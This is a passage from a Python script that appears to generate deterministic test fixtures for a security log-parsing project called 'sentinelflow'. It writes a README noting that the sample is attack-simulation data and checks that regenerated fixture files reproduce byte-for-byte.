            "Exact counts and checksum | Synthetic / MIT |",
            "",
            "The public sample, its six selected source rows, explicit privacy transformations,",
            "MIT notice, and upstream README licensing caveat are in `public/provenance.json`",
            "and `public/LICENSE.OTRF`. It is attack-simulation data used for parser",
            "interoperability, not a benign scenario or a claim of public attack detection.",
        ]
    )
    (DATA / "README.md").write_text("\n".join(lines) + "\n")
    return registry


def check_reproducible() -> None:
    global DATA
    original = DATA
    with tempfile.TemporaryDirectory(prefix="sentinelflow-fixtures-") as temporary:
        DATA = Path(temporary) / "test-data"
        DATA.mkdir()
        try:
            public = original / "public" / "manifest.json"
            if public.exists():
                (DATA / "public").mkdir()
                shutil.copyfile(public, DATA / "public" / "manifest.json")
            generate()
            generated = [path for path in DATA.rglob("*") if path.is_file()]
            for path in generated:
                committed = original / path.relative_to(DATA)
                if not committed.is_file() or committed.read_bytes() != path.read_bytes():
                    raise ValueError(f"Fixture is not reproducible: {path.relative_to(DATA)}")
            print(f"Reproduced {len(generated)} generated files byte-for-byte in isolated storage.")
        finally:
            DATA = original


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate or verify all deterministic test data")
    parser.add_argument(
        "--check", action="store_true", help="Compare without modifying project data"
    )
    args = parser.parse_args()
    if args.check:
        check_reproducible()
    else:
        datasets = generate()
        print(
            f"Saved {len(datasets)} datasets with {sum(item['event_count'] for item in datasets)} records."
        )
